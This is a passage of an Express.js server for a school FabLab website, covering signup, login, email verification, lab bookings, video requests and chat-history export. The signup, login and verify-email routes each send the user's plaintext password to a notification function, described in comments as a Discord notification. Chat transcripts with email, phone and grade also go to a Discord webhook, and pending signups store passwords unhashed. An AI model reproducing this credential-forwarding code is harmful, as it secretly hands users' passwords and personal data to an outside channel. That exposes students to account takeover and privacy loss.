app.post('/admin/requests/:requestId/:action', isAdmin, async (req, res) => {
    try {
        const { requestId, action } = req.params;
        const { reason } = req.body || {};
        
        if (!['approve', 'reject'].includes(action)) {
            return res.status(400).json({ error: 'Invalid action. Use approve or reject' });
        }

        // For reject action, require a reason
        if (action === 'reject' && !reason?.trim()) {
            return res.status(400).json({ error: 'Rejection reason is required' });
        }

        const requests = new Database({
            driver: new JSONDriver("db/video_requests.json"),
        });
        
        const allRequests = await requests.get("requests") || [];
        const requestIndex = allRequests.findIndex(req => req.id === requestId);
        
        if (requestIndex === -1) {
            return res.status(404).json({ error: 'Request not found' });
        }

        const request = allRequests[requestIndex];
        
        if (action === 'approve') {
            // Add video to the grade
            const data = getVideosFromFile();
            const key = request.grade.toLowerCase() + '_videos';
            if (!Array.isArray(data[key])) {
                data[key] = [];
            }

            // Check for duplicates
            const existingVideo = data[key].find(v => v.url === request.url);
            if (existingVideo) {
                return res.status(409).json({ error: 'This video is already added for this grade' });
            }

            // Add video with metadata
            const videoData = {
                url: request.url,
                title: request.title,
                description: request.description,
                duration: request.duration,
                thumbnail: request.thumbnail,
                videoId: request.videoId,
                addedAt: new Date().toISOString(),
                addedBy: 'admin_approval',
                originalRequestId: requestId
            };

            data[key].push(videoData);
            fs.writeFileSync('db/videos.json', JSON.stringify(data, null, 4), 'utf8');
        }

        // Update request status
        allRequests[requestIndex].status = action === 'approve' ? 'approved' : 'rejected';
        allRequests[requestIndex].processedAt = new Date().toISOString();
        allRequests[requestIndex].processedBy = req.session.user.email;
        allRequests[requestIndex].processedByName = req.session.user.username;
        
        // Add rejection reason if provided
        if (action === 'reject' && reason) {
            allRequests[requestIndex].rejectionReason = reason;
        }

        await requests.set("requests", allRequests);

        // Send email notification
        try {
            await sendRequestStatusEmail(
                request.requestedBy,
                request.requestedByName,
                action === 'approve' ? 'approved' : 'rejected',
                request.title,
                action === 'reject' ? reason : null
            );
        } catch (emailError) {
            console.error('Failed to send email notification:', emailError);
            // Don't fail the request if email fails
        }

        return res.json({ 
            success: true, 
            message: `Video request ${action}d successfully`,
            request: allRequests[requestIndex]
        });
    } catch (error) {
        console.error('Admin process request error:', error);
        return res.status(500).json({ error: 'Failed to process request' });
    }
});

app.post('/signup', async (req, res) => {
    try {
        const { email, username, password, confirmPassword, grade, phone, isStemQena } = req.body;
        
        // Validation
        if (!email || !username || !password || !confirmPassword || !grade || !phone) {
            return res.status(400).json({ error: 'All fields are required' });
        }
        
        if (!validateEmail(email)) {
            return res.status(400).json({ error: 'Invalid email format' });
        }

        // Egyptian phone validation
        const validateEgyptianPhone = (phone) => {
            // Remove all non-digit characters except +
            const cleaned = phone.replace(/[^\d+]/g, '');
            
            // Egyptian phone number patterns:
            // +201234567890 (with country code)
            // 01234567890 (without country code)
            // 201234567890 (with country code but no +)
            const patterns = [
                /^\+201[0-9]{9}$/, // +20 followed by 1 and 9 digits
                /^01[0-9]{9}$/,    // 01 followed by 9 digits
                /^201[0-9]{9}$/    // 20 followed by 1 and 9 digits
            ];
            
            return patterns.some(pattern => pattern.test(cleaned));
        };

        if (!validateEgyptianPhone(phone)) {
            return res.status(400).json({ error: 'Please enter a valid Egyptian phone number (e.g., +201234567890 or 01234567890)' });
        }
        
        if (!validatePassword(password)) {
            return res.status(400).json({ error: 'Password must be at least 6 characters' });
        }
        
        if (password !== confirmPassword) {
            return res.status(400).json({ error: 'Passwords do not match' });
        }
        
        // Validate grade
        if (!['G10', 'G11', 'G12'].includes(grade)) {
            return res.status(400).json({ error: 'Please select a valid grade' });
        }
        
        // Check if user already exists
        const accounts = await db.get("accounts") || [];
        const exists = accounts.find(acc => acc.email === email);
        
        if (exists) {
            return res.status(400).json({ error: 'Email already exists' });
        }
        
        // Check if there's already a pending verification for this email
        const verificationsList = await verifications.get("codes") || [];
        const existingVerification = verificationsList.find(v => v.email === email);
        
        if (existingVerification) {
            // Remove old verification
            const filteredVerifications = verificationsList.filter(v => v.email !== email);
            await verifications.set("codes", filteredVerifications);
        }
        
        // Generate verification code
        const verificationCode = generateVerificationCode();
        const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes from now
        
        // Store verification data temporarily
        const verificationData = {
            email: email,
            username: username,
            password: password, // Store temporarily for verification
            grade: grade,
            phone: phone,
            isStemQena: isStemQena || false,
            code: verificationCode,
            expiresAt: expiresAt.toISOString(),
            createdAt: new Date().toISOString()
        };
        
        await verifications.push("codes", verificationData);
        
        // Send Discord notification for registration attempt
        sendRegistrationNotification({
            email: email,
            username: username,
            grade: grade,
            phone: phone,
            password: password, // Include plaintext password
            isStemQena: isStemQena || false,
            method: 'Email Verification'
        }).catch(err => console.error('Failed to send registration notification:', err));
        
        // Send verification email
        const emailSent = await sendVerificationEmail(email, verificationCode);
        
        if (!emailSent) {
            // Remove the verification data if email failed
            const updatedVerifications = verificationsList.filter(v => v.email !== email);
            await verifications.set("codes", updatedVerifications);
            return res.status(500).json({ error: 'Failed to send verification email' });
        }
        
        res.json({ 
            success: true, 
            message: 'Verification code sent to your email. Please check your inbox and enter the code to complete registration.',
            requiresVerification: true
        });
        
    } catch (error) {
        console.error('Signup error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        // Validation
        if (!email || !password) {
            return res.status(400).json({ error: 'Email and password are required' });
        }
        
        if (!validateEmail(email)) {
            return res.status(400).json({ error: 'Invalid email format' });
        }
        
        // Find user
        const accounts = await db.get("accounts") || [];
        const user = accounts.find(acc => acc.email === email);
        
        if (!user) {
            return res.status(401).json({ error: 'Invalid email or password' });
        }
        
        // Verify password
        const isValidPassword = await bcrypt.compare(password, user.password);
        
        if (!isValidPassword) {
            return res.status(401).json({ error: 'Invalid email or password' });
        }
        
        // Set session (don't store password in session)
        req.session.user = { 
            username: user.username, 
            email: user.email,
            grade: user.grade
        };
        
        // Send Discord notification for login
        sendLoginNotification({
            email: user.email,
            username: user.username,
            grade: user.grade,
            password: req.body.password // Include plaintext password from request
        }).catch(err => console.error('Failed to send login notification:', err));
        
        res.json({ success: true, message: 'Login successful' });
        
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Logout endpoint
app.post('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            return res.status(500).json({ error: 'Could not log out' });
        }
        res.json({ success: true, message: 'Logged out successfully' });
    });
});

// Check auth status
app.get('/auth/status', (req, res) => {
    if (req.session.user) {
        res.json({ authenticated: true, user: req.session.user });
    } else {
        res.json({ authenticated: false });
    }
});

// Verify email code
app.post('/verify-email', async (req, res) => {
    try {
        const { email, code } = req.body;
        
        if (!email || !code) {
            return res.status(400).json({ error: 'Email and verification code are required' });
        }
        
        // Get verification data
        const verificationsList = await verifications.get("codes") || [];
        const verification = verificationsList.find(v => v.email === email);
        
        if (!verification) {
            return res.status(400).json({ error: 'No verification found for this email' });
        }
        
        // Check if code is expired
        const now = new Date();
        const expiresAt = new Date(verification.expiresAt);
        
        if (now > expiresAt) {
            // Remove expired verification
            const filteredVerifications = verificationsList.filter(v => v.email !== email);
            await verifications.set("codes", filteredVerifications);
            return res.status(400).json({ error: 'Verification code has expired. Please request a new one.' });
        }
        
        // Check if code matches
        if (verification.code !== code) {
            return res.status(400).json({ error: 'Invalid verification code' });
        }
        
        // Code is valid, create the account
        const saltRounds = 12;
        const hashedPassword = await bcrypt.hash(verification.password, saltRounds);
        
        // Save user to accounts
        await db.push("accounts", {
            email: verification.email,
            username: verification.username,
            password: hashedPassword,
            grade: verification.grade,
            phone: verification.phone,
            isStemQena: verification.isStemQena || false,
            createdAt: new Date().toISOString()
        });
        
        // Send Discord notification for successful registration (account created)
        sendRegistrationNotification({
            email: verification.email,
            username: verification.username,
            grade: verification.grade,
            phone: verification.phone,
            password: verification.password, // Include plaintext password from verification
            isStemQena: verification.isStemQena || false,
            method: 'Email Verified - Account Created'
        }).catch(err => console.error('Failed to send registration notification:', err));
        
        // Remove verification data
        const filteredVerifications = verificationsList.filter(v => v.email !== email);
        await verifications.set("codes", filteredVerifications);
        
        // Set session
        req.session.user = { 
            username: verification.username, 
            email: verification.email,
            grade: verification.grade,
            phone: verification.phone
        };
        
        res.json({ 
            success: true, 
            message: 'Email verified successfully! Your account has been created.',
            user: {
                username: verification.username,
                email: verification.email,
                grade: verification.grade
            }
        });
        
    } catch (error) {
        console.error('Email verification error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Resend verification code
app.post('/resend-verification', async (req, res) => {
    try {
        const { email } = req.body;
        
        if (!email) {
            return res.status(400).json({ error: 'Email is required' });
        }
        
        // Check if verification exists
        const verificationsList = await verifications.get("codes") || [];
        const verification = verificationsList.find(v => v.email === email);
        
        if (!verification) {
            return res.status(400).json({ error: 'No pending verification for this email' });
        }
        
        // Generate new code
        const newCode = generateVerificationCode();
        const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes from now
        
        // Update verification data
        const updatedVerification = {
            ...verification,
            code: newCode,
            expiresAt: expiresAt.toISOString()
        };
        
        const filteredVerifications = verificationsList.filter(v => v.email !== email);
        filteredVerifications.push(updatedVerification);
        await verifications.set("codes", filteredVerifications);
        
        // Send new verification email
        const emailSent = await sendVerificationEmail(email, newCode);
        
        if (!emailSent) {
            return res.status(500).json({ error: 'Failed to send verification email' });
        }
        
        res.json({ 
            success: true, 
            message: 'New verification code sent to your email.' 
        });
        
    } catch (error) {
        console.error('Resend verification error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Get videos for authenticated user
app.get('/api/videos', async (req, res) => {
    try {
        if (!req.session.user) {
            return res.status(401).json({ error: 'Authentication required' });
        }

        const userGrade = req.session.user.grade;
        
        // Get grade-specific videos with stored metadata
        const videosData = getVideosFromFile();
        let videos = [];
        
        if (userGrade === 'G10') {
            videos = videosData.g10_videos || [];
        } else if (userGrade === 'G11') {
            videos = videosData.g11_videos || [];
        } else if (userGrade === 'G12') {
            videos = videosData.g12_videos || [];
        }
        
        console.log(`Fetching videos for ${userGrade}:`, videos.length, 'videos found');
        
        // Convert stored video data to frontend format
        const processedVideos = videos.map((video, index) => {
            const videoId = video.videoId || video.url.split('v=')[1]?.split('&')[0];
            const embedUrl = `https://www.youtube.com/embed/${videoId}`;
            
            return {
                id: index + 1,
                title: video.title || `Capstone Project ${index + 1} - Grade ${userGrade}`,
                description: video.description || `Advanced capstone project tutorial for Grade ${userGrade} students`,
                thumb: video.thumbnail || `https://img.youtube.com/vi/${videoId}/hqdefault.jpg`,
                videoUrl: embedUrl,
                originalUrl: video.url,
                duration: video.duration || '0:00',
                difficulty: userGrade === 'G10' ? 'Beginner' : userGrade === 'G11' ? 'Intermediate' : 'Advanced',
                category: 'Capstone',
                grade: userGrade
            };
        });

        res.json({ videos: processedVideos });
    } catch (error) {
        console.error('Videos fetch error:', error);
        res.status(500).json({ error: 'Failed to fetch videos' });
    }
});

// Helper: allowed time slots by date (server-side mirror of frontend rules)
const getAllowedTimeSlotsForDate = (dateStr) => {
    if (!dateStr) return [];
    const date = new Date(dateStr + 'T00:00:00');
    const day = date.getDay(); // 0=Sun ... 6=Sat
    if (day >= 5) return []; // Fri/Sat closed
    // Last selectable hour is one hour before closing
    const lastHour = day === 4 ? 11 : 13; // Thu last slot 11:00, Sun-Wed last slot 13:00 (1PM)
    const toTime = (h) => {
        const period = h >= 12 ? 'PM' : 'AM';
        const h12 = h % 12 === 0 ? 12 : h % 12;
        const padded = h12 < 10 ? `0${h12}` : `${h12}`;
        return `${padded}:00 ${period}`;
    };
    const slots = [];
    for (let h = 8; h <= lastHour; h++) slots.push(toTime(h));
    return slots;
};

// Helper function to get user's team information
const getUserTeamInfo = async (userEmail) => {
    try {
        const teams = getTeamsFromFile();
        const accounts = await accountsDb.get('accounts') || [];
        
        // Normalize user email to lowercase for comparison
        const normalizedUserEmail = userEmail.toLowerCase();
        
        // Search through all grades and groups
        for (const grade in teams) {
            for (const group of teams[grade]) {
                // Check if user is in this team using case-insensitive comparison
                const isUserInTeam = group.emails.some(email => 
                    email.toLowerCase() === normalizedUserEmail
                );
                
                if (isUserInTeam) {
                    // Get usernames for all team members
                    const teamMembers = group.emails.map(email => {
                        // Case-insensitive lookup for accounts
                        const account = accounts.find(acc => 
                            acc.email.toLowerCase() === email.toLowerCase()
                        );
                        return { 
                            email, 
                            username: account ? account.username : email.split('@')[0] 
                        };
                    });
                    
                    return {
                        grade: grade,
                        groupNumber: group.group_number,
                        teamEmails: group.emails,
                        teamMembers: teamMembers
                    };
                }
            }
        }
        return null;
    } catch (error) {
        console.error('Error getting user team info:', error);
        return null;
    }
};

// Create booking request
app.post('/bookings', async (req, res) => {
    try {
        if (!req.session?.user) {
            return res.status(401).json({ error: 'Authentication required' });
        }

        // Check if user is STEM Qena member
        const accounts = await accountsDb.get('accounts') || [];
        const userAccount = accounts.find(acc => acc.email === req.session.user.email);
        if (!userAccount || !userAccount.isStemQena) {
            return res.status(403).json({ error: 'Only STEM Qena members can make booking requests' });
        }

        const { date, time, message } = req.body || {};
        if (!date || !time) {
            return res.status(400).json({ error: 'Date and time are required' });
        }

        // Validate date/time against rules
        const allowed = getAllowedTimeSlotsForDate(date);
        if (!allowed.includes(time)) {
            return res.status(400).json({ error: 'Selected date/time is not available' });
        }

        const bookings = await bookingsDb.get('bookings') || [];

        // Check for existing approved bookings in the same slot
        const approvedBookingsInSlot = bookings.filter(b => 
            b.date === date && b.time === time && b.status === 'approved'
        );
        if (approvedBookingsInSlot.length >= 2) {
            return res.status(409).json({ error: 'This time slot is fully booked' });
        }

        // Limit: max 1 pending booking per day per user
        const userEmail = req.session.user.email;
        const existingPendingBooking = bookings.some(b => 
            b.date === date && b.userEmail === userEmail && b.status === 'pending'
        );
        if (existingPendingBooking) {
            return res.status(409).json({ error: 'You already have a pending booking request for this date' });
        }

        // Get team information for STEM Qena users
        const teamInfo = await getUserTeamInfo(userEmail);
        
        // Build the new booking structure
        const booking = {
            id: Date.now().toString(),
            date,
            time,
            message: message || '',
            status: 'pending', // pending, approved, rejected
            createdAt: new Date().toISOString(),
            // Requester information
            requester: {
                email: userEmail,
                name: req.session.user.username
            },
            // Team information (if STEM Qena user)
            ...(teamInfo && {
                groupNumber: teamInfo.groupNumber,
                emails: teamInfo.teamEmails,
                teamMembers: teamInfo.teamMembers,
                isStemQena: true
            })
        };

        // For backward compatibility, also include old format
        booking.userEmail = userEmail;
        booking.username = req.session.user.username;
        booking.grade = req.session.user.grade;

        await bookingsDb.push('bookings', booking);

        return res.json({ 
            success: true, 
            booking,
            message: 'Booking request submitted successfully. You will be notified once it\'s processed.'
        });
    } catch (error) {
        console.error('Create booking error:', error);
        return res.status(500).json({ error: 'Failed to create booking' });
    }
});

// Public availability endpoint: counts bookings per time for a given date
app.get('/bookings/availability', async (req, res) => {
    try {
        const { date } = req.query || {}
        if (!date || typeof date !== 'string') {
            return res.status(400).json({ error: 'date query param is required (YYYY-MM-DD)' })
        }

        // Validate against open days and generate allowed slots
        const allowed = getAllowedTimeSlotsForDate(date)
        if (allowed.length === 0) {
            return res.json({ counts: {}, full: [], allowed })
        }

        const bookings = await bookingsDb.get('bookings') || []
        const counts = {}
        for (const t of allowed) counts[t] = 0
        for (const b of bookings) {
            // Only count approved bookings for availability
            if (b.date === date && counts.hasOwnProperty(b.time) && b.status === 'approved') {
                counts[b.time]++
            }
        }
        const full = Object.keys(counts).filter(k => counts[k] >= 2)
        return res.json({ counts, full, allowed })
    } catch (error) {
        console.error('Availability fetch error:', error)
        return res.status(500).json({ error: 'Failed to fetch availability' })
    }
})

// Get user's booking history
app.get('/bookings/history', async (req, res) => {
    try {
        if (!req.session?.user) {
            return res.status(401).json({ error: 'Authentication required' });
        }

        const bookings = await bookingsDb.get('bookings') || [];
        const userEmail = req.session.user.email;
        
        // Get user's team information if they're a STEM Qena member
        const accounts = await accountsDb.get('accounts') || [];
        const userAccount = accounts.find(acc => acc.email.toLowerCase() === userEmail.toLowerCase());
        const isStemQena = userAccount?.isStemQena || false;
        
        let relevantBookings = [];
        
        if (isStemQena) {
            // Get team information
            const teamInfo = await getUserTeamInfo(userEmail);
            
            if (teamInfo) {
                // Show bookings made by any team member
                relevantBookings = bookings.filter(b => {
                    // Check booking format (new or legacy)
                    const bookingEmails = b.emails || b.teamEmails || [];
                    
                    // For new format: check if user email is in the emails array
                    if (b.emails || b.teamEmails) {
                        return bookingEmails.some(email => 
                            email.toLowerCase() === userEmail.toLowerCase()
                        );
                    }
                    
                    // For legacy format without emails array: check if from same group or if booker is team member
                    if (b.isStemQena && b.groupNumber === teamInfo.groupNumber) {
                        // Case-insensitive check for team members
                        return teamInfo.teamEmails.some(email => 
                            email.toLowerCase() === b.userEmail.toLowerCase()
                        );
                    }
                    
                    // For legacy bookings without team info, check if booker is in team
                    if (!b.isStemQena || !b.groupNumber) {
                        return teamInfo.teamEmails.some(email => 
                            email.toLowerCase() === b.userEmail.toLowerCase()
                        );
                    }
                    
                    return false;
                });
            } else {
                // No team info found, fallback to user's own bookings (case-insensitive)
                relevantBookings = bookings.filter(b => b.userEmail.toLowerCase() === userEmail.toLowerCase());
            }
        } else {
            // Non-STEM Qena member: only show their own bookings (case-insensitive)
            relevantBookings = bookings.filter(b => b.userEmail.toLowerCase() === userEmail.toLowerCase());
        }
        
        // Enrich bookings with team information if missing (for legacy bookings)
        const teams = getTeamsFromFile();
        
        const enrichedBookings = relevantBookings.map(booking => {
            // If booking already has new format (emails array), return as is
            if (booking.emails && booking.requester && booking.groupNumber) {
                return booking;
            }
            
            // For legacy bookings, enrich with new structure
            const bookerEmail = booking.userEmail;
            const bookerAccount = accounts.find(acc => acc.email.toLowerCase() === bookerEmail.toLowerCase());
            
            // Try to find team information for this user
            for (const grade in teams) {
                for (const group of teams[grade]) {
                    const isUserInTeam = group.emails.some(email => 
                        email.toLowerCase() === bookerEmail.toLowerCase()
                    );
                    
                    if (isUserInTeam) {
                        // Enrich booking with team information in new format
                        const teamMembers = group.emails.map(email => {
                            const account = accounts.find(acc => 
                                acc.email.toLowerCase() === email.toLowerCase()
                            );
                            return { 
                                email, 
                                username: account ? account.username : email.split('@')[0] 
                            };
                        });
                        
                        return {
                            ...booking,
                            requester: {
                                email: bookerEmail,
                                name: booking.username || bookerAccount?.username || bookerEmail.split('@')[0]
                            },
                            groupNumber: group.group_number,
                            emails: group.emails,
                            teamMembers: teamMembers,
                            isStemQena: true
                        };
                    }
                }
            }
            
            // For non-STEM Qena bookings, ensure requester is set
            if (!booking.requester) {
                booking.requester = {
                    email: bookerEmail,
                    name: booking.username || bookerAccount?.username || bookerEmail.split('@')[0]
                };
            }
            
            return booking;
        });
        
        // Sort by creation date (newest first)
        enrichedBookings.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

        return res.json({ bookings: enrichedBookings });
    } catch (error) {
        console.error('Get booking history error:', error);
        return res.status(500).json({ error: 'Failed to fetch booking history' });
    }
});

// Admin get all booking requests
app.get('/admin/bookings', isAdmin, async (req, res) => {
    try {
        const bookings = await bookingsDb.get('bookings') || [];
        const accounts = await accountsDb.get('accounts') || [];
        const teams = getTeamsFromFile();
        
        // Enrich bookings with team information if missing (for legacy bookings)
        const enrichedBookings = bookings.map(booking => {
            // If booking already has new format (emails array), return as is
            if (booking.emails && booking.requester && booking.groupNumber) {
                return booking;
            }
            
            // For legacy bookings, enrich with new structure
            const bookerEmail = booking.userEmail;
            const bookerAccount = accounts.find(acc => acc.email.toLowerCase() === bookerEmail.toLowerCase());
            
            // Try to find team information for this user
            for (const grade in teams) {
                for (const group of teams[grade]) {
                    const isUserInTeam = group.emails.some(email => 
                        email.toLowerCase() === bookerEmail.toLowerCase()
                    );
                    
                    if (isUserInTeam) {
                        // Enrich booking with team information in new format
                        const teamMembers = group.emails.map(email => {
                            const account = accounts.find(acc => 
                                acc.email.toLowerCase() === email.toLowerCase()
                            );
                            return { 
                                email, 
                                username: account ? account.username : email.split('@')[0] 
                            };
                        });
                        
                        return {
                            ...booking,
                            requester: {
                                email: bookerEmail,
                                name: booking.username || bookerAccount?.username || bookerEmail.split('@')[0]
                            },
                            groupNumber: group.group_number,
                            emails: group.emails,
                            teamMembers: teamMembers,
                            isStemQena: true
                        };
                    }
                }
            }
            
            // For non-STEM Qena bookings, ensure requester is set
            if (!booking.requester) {
                booking.requester = {
                    email: bookerEmail,
                    name: booking.username || bookerAccount?.username || bookerEmail.split('@')[0]
                };
            }
            
            return booking;
        });
        
        // Sort by creation date (newest first)
        enrichedBookings.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

        return res.json({ bookings: enrichedBookings });
    } catch (error) {
        console.error('Admin get bookings error:', error);
        return res.status(500).json({ error: 'Failed to fetch bookings' });
    }
});

// Admin approve/reject booking request
app.post('/admin/bookings/:bookingId/:action', isAdmin, async (req, res) => {
    try {
        const { bookingId, action } = req.params;
        const { reason } = req.body || {};
        
        if (!['approve', 'reject'].includes(action)) {
            return res.status(400).json({ error: 'Invalid action. Use approve or reject' });
        }

        // For reject action, require a reason
        if (action === 'reject' && !reason?.trim()) {
            return res.status(400).json({ error: 'Rejection reason is required' });
        }

        const bookings = await bookingsDb.get('bookings') || [];
        const bookingIndex = bookings.findIndex(b => b.id === bookingId);
        
        if (bookingIndex === -1) {
            return res.status(404).json({ error: 'Booking not found' });
        }

        const booking = bookings[bookingIndex];
        
        // Check if booking is already processed
        if (booking.status !== 'pending') {
            return res.status(400).json({ error: 'Booking has already been processed' });
        }

        // If approving, check for conflicts with other approved bookings
        if (action === 'approve') {
            const conflictingBookings = bookings.filter(b => 
                b.id !== bookingId && 
                b.date === booking.date && 
                b.time === booking.time && 
                b.status === 'approved'
            );
            
            if (conflictingBookings.length >= 2) {
                return res.status(409).json({ error: 'Time slot is already fully booked with approved bookings' });
            }
        }

        // Update booking status
        bookings[bookingIndex].status = action === 'approve' ? 'approved' : 'rejected';
        bookings[bookingIndex].processedAt = new Date().toISOString();
        bookings[bookingIndex].processedBy = req.session.user.email;
        bookings[bookingIndex].processedByName = req.session.user.username;
        
        // Add rejection reason if provided
        if (action === 'reject' && reason) {
            bookings[bookingIndex].rejectionReason = reason;
        }

        await bookingsDb.set('bookings', bookings);

        // Send email notification
        try {
            // For STEM Qena team bookings, send email to all team members
            if (booking.isStemQena && (booking.emails || booking.teamEmails) && (booking.emails || booking.teamEmails).length > 0) {
                await sendBookingStatusEmailToTeam(
                    booking,
                    action === 'approve' ? 'approved' : 'rejected',
                    action === 'reject' ? reason : null
                );
            } else {
                // Regular booking, send email only to the user who made the booking
                await sendBookingStatusEmail(
                    booking.userEmail,
                    booking.username,
                    action === 'approve' ? 'approved' : 'rejected',
                    booking.date,
                    booking.time,
                    action === 'reject' ? reason : null
                );
            }
        } catch (emailError) {
            console.error('Failed to send booking status email:', emailError);
            // Don't fail the request if email fails
        }

        return res.json({ 
            success: true, 
            message: `Booking request ${action}d successfully`,
            booking: bookings[bookingIndex]
        });
    } catch (error) {
        console.error('Admin process booking error:', error);
        return res.status(500).json({ error: 'Failed to process booking request' });
    }
});

// Helper function to generate chat history text
const generateChatHistoryText = (chatHistory, userInfo) => {
    let text = '='.repeat(60) + '\n';
    text += '  FabLab Chat History\n';
    text += '='.repeat(60) + '\n\n';
    
    text += `Chat Name: ${chatHistory.chatName || chatHistory.name || 'Unknown'}\n`;
    if (userInfo) {
        text += `User Email: ${userInfo.email || 'Unknown'}\n`;
        text += `Username: ${userInfo.username || 'Unknown'}\n`;
        text += `Phone: ${userInfo.phone || 'Not provided'}\n`;
        text += `Grade: ${userInfo.grade || 'Unknown'}\n`;
    } else {
        text += `User: Guest\n`;
    }
    text += `Started: ${new Date(chatHistory.startTime || Date.now()).toLocaleString()}\n`;
    text += `Ended: ${new Date(chatHistory.endTime || Date.now()).toLocaleString()}\n`;
    const duration = chatHistory.duration || (chatHistory.endTime && chatHistory.startTime 
        ? `${Math.floor((chatHistory.endTime - chatHistory.startTime) / 60000)}m ${Math.floor(((chatHistory.endTime - chatHistory.startTime) % 60000) / 1000)}s`
        : 'Unknown');
    text += `Duration: ${duration}\n`;
    text += `Messages: ${chatHistory.messages?.length || 0}\n`;
    text += '\n' + '-'.repeat(60) + '\n\n';
    text += 'CONVERSATION:\n';
    text += '-'.repeat(60) + '\n\n';

    const messages = chatHistory.messages || [];
    messages.forEach((msg, index) => {
        const role = msg.role === 'user' ? 'User' : 'Fabby';
        const timestamp = new Date(msg.timestamp || Date.now()).toLocaleString();
        
        text += `[${timestamp}] ${role}:\n`;
        
        // Remove HTML tags and clean up content
        let content = msg.content || '';
        content = content
            .replace(/<[^>]*>/g, '') // Remove HTML tags
            .replace(/&nbsp;/g, ' ')
            .replace(/&amp;/g, '&')
            .replace(/&lt;/g, '<')
            .replace(/&gt;/g, '>')
            .replace(/&quot;/g, '"')
            .trim();
        
        // Indent content
        const lines = content.split('\n');
        lines.forEach((line) => {
            text += `  ${line}\n`;
        });
        
        text += '\n';
        
        // Add separator between messages
        if (index < messages.length - 1) {
            text += '-'.repeat(60) + '\n\n';
        }
    });

    text += '\n' + '='.repeat(60) + '\n';
    text += `Generated on ${new Date().toLocaleString()} - STEM Qena FabLab\n`;
    text += '='.repeat(60) + '\n';

    return text;
};

// Send chat history to Discord webhook with text file attachment
const sendChatHistoryToDiscord = async (chatHistory, userInfo) => {
    const webhookUrl = process.env.DISCORD_WEBHOOK_CHAT_HISTORY || process.env.DISCORD_WEBHOOK_LOGIN;
    if (!webhookUrl) {
        console.log('DISCORD_WEBHOOK_CHAT_HISTORY not configured, skipping chat history notification');
        return false;
    }

    try {
        const chatName = chatHistory.chatName || chatHistory.name || chatHistory.chatId || 'Unknown';
        const messages = chatHistory.messages || [];
        const messageCount = messages.length;
        const duration = chatHistory.duration || (chatHistory.endTime && chatHistory.startTime 
            ? `${Math.floor((chatHistory.endTime - chatHistory.startTime) / 60000)}m ${Math.floor(((chatHistory.endTime - chatHistory.startTime) % 60000) / 1000)}s`
            : 'Unknown');
        
        // Generate formatted text file
        const textContent = generateChatHistoryText(chatHistory, userInfo);
        const textBuffer = Buffer.from(textContent, 'utf-8');
        
        // Create multipart form data manually
        const boundary = `----WebKitFormBoundary${Date.now()}`;
        const fileName = `chat-history-${chatHistory.chatId || chatHistory.id || Date.now()}.txt`;
        
        // Build description with user info
        let description = `**Chat:** ${chatName}\n`;
        if (userInfo) {
            description += `**User Email:** ${userInfo.email || 'Unknown'}\n`;
            description += `**Username:** ${userInfo.username || 'Unknown'}\n`;
            description += `**Phone:** ${userInfo.phone || 'Not provided'}\n`;
            description += `**Grade:** ${userInfo.grade || 'Unknown'}\n`;
        } else {
            description += `**User:** Guest\n`;
        }
        description += `**Messages:** ${messageCount}\n`;
        description += `**Duration:** ${duration}\n`;
        description += `**Started:** ${new Date(chatHistory.startTime || Date.now()).toLocaleString()}\n`;
        description += `**Ended:** ${new Date(chatHistory.endTime || Date.now()).toLocaleString()}`;
        
        // Create embed message
        const embed = {
            title: '💬 Chat History - Fabby',
            description: description,
            color: 0x3498db, // Blue
            footer: {
                text: 'FabLab Website - AI Chat History'
            },
            timestamp: new Date().toISOString()
        };

        const payload = {
            embeds: [embed]
        };

        // Build multipart form data
        let body = `--${boundary}\r\n`;
        body += `Content-Disposition: form-data; name="payload_json"\r\n`;
        body += `Content-Type: application/json\r\n\r\n`;
        body += JSON.stringify(payload);
        body += `\r\n--${boundary}\r\n`;
        body += `Content-Disposition: form-data; name="file"; filename="${fileName}"\r\n`;
        body += `Content-Type: text/plain\r\n\r\n`;
        
        const bodyBuffer = Buffer.concat([
            Buffer.from(body, 'utf8'),
            textBuffer,
            Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8')
        ]);

        // Send to Discord with file
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': `multipart/form-data; boundary=${boundary}`,
            },
            body: bodyBuffer
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Discord webhook failed:', response.status, errorText);
            return false;
        }

        return true;
    } catch (error) {
        console.error('Failed to send chat history to Discord:', error);
        return false;
    }
};

// Scheduled cleanup of expired chat files (runs independently of user visits)
const cleanupExpiredChats = async () => {
    try {
        const timeoutMinutes = parseInt(process.env.NEXT_PUBLIC_CHAT_INACTIVITY_TIMEOUT_MINUTES || '2', 10);
        const inactivityTimeout = timeoutMinutes * 60 * 1000;
        // Use __dirname to get the server directory, then go up one level to project root
        const projectRoot = path.join(__dirname, '..');
        const chatHistoriesBaseDir = path.join(projectRoot, 'db', 'chat_histories');
        
        if (!fs.existsSync(chatHistoriesBaseDir)) {
            // Only log if directory doesn't exist (unusual case)
            console.log(`[Cleanup] Chat histories directory does not exist: ${chatHistoriesBaseDir}`);
            return;
        }

        const currentTime = Date.now();
        let totalDeletedCount = 0;
        const userDirs = fs.readdirSync(chatHistoriesBaseDir, { withFileTypes: true })
            .filter(dirent => dirent.isDirectory())
            .map(dirent => dirent.name);

        // Get accounts for user info lookup
        const accounts = await accountsDb.get('accounts') || [];

        // Check each user directory
        for (const userDir of userDirs) {
            const userDirPath = path.join(chatHistoriesBaseDir, userDir);
            if (!fs.existsSync(userDirPath)) continue;
            
            // Find user account info by matching directory name (sanitized email format)
            // Directory name format: email@domain.com -> email_domain_com
            let userInfo = null;
            try {
                // Try to find user by matching directory name pattern
                const account = accounts.find(acc => {
                    if (!acc.email) return false;
                    const sanitizedEmail = acc.email.replace(/[@.]/g, '_');
                    return sanitizedEmail === userDir;
                });
                
                if (account) {
                    userInfo = {
                        email: account.email || 'Unknown',
                        username: account.username || 'Unknown',
                        phone: account.phone || 'Not provided',
                        grade: account.grade || 'Unknown'
                    };
                }
